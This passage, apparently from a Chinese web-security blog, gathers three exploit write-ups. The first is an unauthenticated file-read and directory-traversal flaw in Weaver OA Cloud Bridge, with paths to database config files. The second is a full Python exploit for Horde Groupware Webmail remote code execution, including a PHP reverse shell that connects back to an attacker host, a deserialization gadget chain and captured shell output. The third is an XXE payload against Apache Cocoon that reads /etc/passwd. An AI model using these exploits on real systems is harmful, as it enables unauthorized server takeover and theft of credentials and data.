href="/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/">泛微OA云桥任意文件读取和目录遍历漏洞</a></h1><div class="content"><p>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。</p>
<p>1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150710482.png" alt="image-20200914150710482"></p>
<p>2、通过查看文件接口访问 /file/fileNoLogin/id</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150728248.png" alt="image-20200914150728248"></p>
<p>想到一个新的思路，能够在漏洞利用过程中找到更多有用的信息。</p>
<p>1、简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。</p>
<p>2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150903715.png" alt="image-20200914150903715"></p>
<p>3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。</p>
<p>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties</p>
<p>d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150946564.png" alt="image-20200914150946564"></p>
<p>修复建议:</p>
<p>关闭程序路由 /file/fileNoLogin</p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E6%B3%9B%E5%BE%AEOA/">泛微OA </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fas fa-angle-double-right"></i>Horde Groupware Webmail Edition 远程命令执行</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:19.555Z" title="2020-12-23T08:50:19.555Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">6 minutes read (About 887 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Horde Groupware Webmail Edition 远程命令执行</a></h1><div class="content"><p>Python Exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Identifiers: ZDI-CAN-10436 / ZDI-20-1051</span></span><br><span class="line"><span class="string">Found by ..: mr_me</span></span><br><span class="line"><span class="string">Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py </span></span><br><span class="line"><span class="string">(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;</span></span><br><span class="line"><span class="string">(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string">(+) targeting http://172.16.175.145/horde/</span></span><br><span class="line"><span class="string">(+) obtained session iefankvohbl8og0mtaadm3efb6</span></span><br><span class="line"><span class="string">(+) inserted our php object</span></span><br><span class="line"><span class="string">(+) triggering deserialization...</span></span><br><span class="line"><span class="string">(+) starting handler on port 1337</span></span><br><span class="line"><span class="string">(+) connection from 172.16.175.145</span></span><br><span class="line"><span class="string">(+) pop thy shell!</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">pwd</span></span><br><span class="line"><span class="string">/var/www/horde/services</span></span><br><span class="line"><span class="string">uname -a</span></span><br><span class="line"><span class="string">Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">exit</span></span><br><span class="line"><span class="string">*** Connection closed by remote host ***</span></span><br><span class="line"><span class="string">(+) repaired the target!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rs</span>(<span class="params">cbh, cbp</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;@error_reporting(-1);</span></span><br><span class="line"><span class="string">@set_time_limit(0); </span></span><br><span class="line"><span class="string">@ignore_user_abort(1);</span></span><br><span class="line"><span class="string">$dis=@ini_get(&#x27;disable_functions&#x27;);</span></span><br><span class="line"><span class="string">if(!empty($dis))&#123;</span></span><br><span class="line"><span class="string">    $dis=preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=explode(&#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=array_map(&#x27;trim&#x27;, $dis);</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">    $dis=array();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$ipaddr=&#x27;%s&#x27;;</span></span><br><span class="line"><span class="string">$port=%d;</span></span><br><span class="line"><span class="string">function PtdSlhY($c)&#123;</span></span><br><span class="line"><span class="string">    global $dis; </span></span><br><span class="line"><span class="string">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27; )) &#123;</span></span><br><span class="line"><span class="string">        $c=$c.&quot; 2&gt;&amp;1\\n&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ob_start();</span></span><br><span class="line"><span class="string">    system($c);</span></span><br><span class="line"><span class="string">    $o=ob_get_contents();</span></span><br><span class="line"><span class="string">    ob_end_clean();</span></span><br><span class="line"><span class="string">    if (strlen($o) === 0)&#123;</span></span><br><span class="line"><span class="string">        $o = &quot;NULL&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return $o;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$nofuncs=&#x27;no exec functions&#x27;;</span></span><br><span class="line"><span class="string">$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);</span></span><br><span class="line"><span class="string">while($c=fread($s,2048))&#123;</span></span><br><span class="line"><span class="string">    $out = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">    if(substr($c,0,3) == &#x27;cd &#x27;)&#123;</span></span><br><span class="line"><span class="string">        chdir(substr($c,3,-1));</span></span><br><span class="line"><span class="string">    &#125;else if (substr($c,0,4) == &#x27;quit&#x27; || substr($c,0,4) == &#x27;exit&#x27;) &#123;</span></span><br><span class="line"><span class="string">        break;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        $out=PtdSlhY(substr($c,0,-1));</span></span><br><span class="line"><span class="string">        if($out===false)&#123;</span></span><br><span class="line"><span class="string">            fwrite($s, $nofuncs);</span></span><br><span class="line"><span class="string">            break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    fwrite($s,$out);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">fclose($s);&quot;&quot;&quot;</span> % (cbh, cbp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session</span>(<span class="params">t, p, usr, pwd</span>):</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%slogin.php&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;login_post&quot;</span> : <span class="number">1337</span>,</span><br><span class="line">        <span class="string">&quot;horde_user&quot;</span> : usr,</span><br><span class="line">        <span class="string">&quot;horde_pass&quot;</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(uri, data=p, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    match = re.findall(<span class="string">&quot;Horde=(.&#123;26&#125;);&quot;</span>, r.headers[<span class="string">&#x27;set-cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">assert</span> len(match) == <span class="number">2</span>, <span class="string">&quot;(-) failed to login&quot;</span></span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_deserialization</span>(<span class="params">t, p, s, host, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;</span></span><br><span class="line">    handlerthr = Thread(target=handler, args=(port,))</span><br><span class="line">    handlerthr.start()</span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/imple&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;imple&quot;</span> : <span class="string">&quot;IMP_Prefs_Sort&quot;</span>,</span><br><span class="line">        <span class="string">&quot;app&quot;</span> : <span class="string">&quot;imp&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    h = &#123; <span class="string">&quot;cmd&quot;</span> : base64.b64encode(rs(host, port).encode()) &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">&quot;(-) failed to trigger deserialization!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pop</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;</span></span><br><span class="line">    pop  = <span class="string">&#x27;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#x27;</span>  <span class="comment"># implements Serializable using custom unserialize/serialize</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span>             <span class="comment"># additional checks</span></span><br><span class="line">    pop += <span class="string">&#x27;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pop</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_patch</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Our original array &quot;&quot;&quot;</span></span><br><span class="line">    patch  = <span class="string">&#x27;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:5:&quot;INBOX&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:1:&quot;b&quot;;i:6;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> patch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_pref</span>(<span class="params">t, p, s, k, o</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/setPrefValue&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;pref&quot;</span> : k,</span><br><span class="line">        <span class="string">&quot;value&quot;</span> : o,</span><br><span class="line">    &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="string">&quot;\&quot;response\&quot;:true&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>), <span class="string">&quot;(-) failed to set the preference!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">lport</span>):</span></span><br><span class="line">    print(<span class="string">&quot;(+) starting handler on port %d&quot;</span> % lport)</span><br><span class="line">    t = telnetlib.Telnet()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">&quot;0.0.0.0&quot;</span>, lport))</span><br><span class="line">    s.listen(<span class="number">1</span>)</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print(<span class="string">&quot;(+) connection from %s&quot;</span> % addr[<span class="number">0</span>])</span><br><span class="line">    t.sock = conn</span><br><span class="line">    print(<span class="string">&quot;(+) pop thy shell!&quot;</span>)</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_path</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;/%s&quot;</span> % p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;%s/&quot;</span> % p</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">&quot;(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    path   = fix_path(sys.argv[<span class="number">2</span>])</span><br><span class="line">    user   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    pswd   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    host   = sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    port   = int(sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">&quot;(+) targeting http://%s%s&quot;</span> % (target, path))</span><br><span class="line">    session = get_session(target, path, user, pswd)</span><br><span class="line">    print(<span class="string">&quot;(+) obtained session %s&quot;</span> % session)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_pop())</span><br><span class="line">    print(<span class="string">&quot;(+) inserted our php object&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;(+) triggering deserialization...&quot;</span>)</span><br><span class="line">    trigger_deserialization(target, path, session, host, port)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_patch())</span><br><span class="line">    print(<span class="string">&quot;(+) repaired the target!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">saturn:~$.&#x2F;poc.py 172.16.175.148&#x2F;horde&#x2F; hordeuser:pass123 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line"></span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6</span><br><span class="line"></span><br><span class="line">(+) inserted our php object</span><br><span class="line"></span><br><span class="line">(+) triggering deserialization...</span><br><span class="line"></span><br><span class="line">(+) starting handler on port 1337</span><br><span class="line"></span><br><span class="line">(+) connection from 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) pop thy shell!</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://srcincite.io/pocs/zdi-20-1051.py.txt">https://srcincite.io/pocs/zdi-20-1051.py.txt</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Horde-Groupware-Webmail-Edition/">Horde Groupware Webmail Edition </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/14/WEB/Exploit/Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991/"><i class="fas fa-angle-double-right"></i>Apache Cocoon XML注入 (CVE-2020-11991)</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:29.011Z" title="2020-12-23T08:50:29.011Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a minute read (About 143 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/14/WEB/Exploit/Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991/">Apache Cocoon XML注入 (CVE-2020-11991)</a></h1><div class="content"><p>程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。</p>
<p>1、漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator,也就是说只要传输的数据被解析就可以实现了。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">ent</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>John<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure>



